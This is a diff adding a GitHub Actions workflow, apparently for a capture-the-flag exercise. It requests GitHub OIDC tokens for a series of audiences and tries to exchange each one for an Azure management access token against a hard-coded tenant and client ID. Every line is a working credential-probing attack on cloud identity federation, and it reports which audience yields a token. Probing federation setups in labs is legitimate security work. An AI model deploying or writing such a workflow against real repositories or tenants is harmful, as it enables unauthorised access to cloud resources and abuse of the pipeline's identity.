@@ -1,0 +1,65 @@
+name: CTF Azure audience probe
+on:
+  push:
+    branches: [ctf-oidc-probe]
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test Azure federation audiences without logging tokens
+        run: |
+          python3 - <<'PY'
+          import base64
+          import json
+          import os
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+
+          tenant = '3205c325-06a5-4171-9ce8-ffc5e6c2845e'
+          client = '72ff278a-9e71-43ec-bac4-2ca303f8e462'
+          audiences = [
+              'api://AzureADTokenExchange',
+              'https://management.azure.com/',
+              'https://vault.azure.net',
+              'api://' + client,
+              client,
+              'https://github.com/duyhhh-oss',
+              'https://github.com/duyhhh-oss/tebamoto-platform',
+          ]
+          url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
+          bearer = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
+          separator = '&' if '?' in url else '?'
+          for audience in audiences:
+              request = urllib.request.Request(
+                  url + separator + 'audience=' + urllib.parse.quote(audience, safe=''),
+                  headers={'Authorization': 'Bearer ' + bearer})
+              try:
+                  with urllib.request.urlopen(request, timeout=15) as response:
+                      jwt = json.load(response)['value']
+              except Exception as error:
+                  print(audience, 'OIDC_ERROR', type(error).__name__)
+                  continue
+              claim = jwt.split('.')[1]
+              claim += '=' * (-len(claim) % 4)
+              subject = json.loads(base64.urlsafe_b64decode(claim)).get('sub')
+              form = urllib.parse.urlencode({
+                  'client_id': client,
+                  'scope': 'https://management.azure.com/.default',
+                  'grant_type': 'client_credentials',
+                  'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+                  'client_assertion': jwt,
+              }).encode()
+              request = urllib.request.Request(
+                  'https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/token',
+                  data=form)
+              try:
+                  with urllib.request.urlopen(request, timeout=15) as response:
+                      result = json.load(response)
+              except urllib.error.HTTPError as error:
+                  result = json.load(error)
+              print(audience, subject, 'OK' if 'access_token' in result else result.get('error'), flush=True)
+          PY
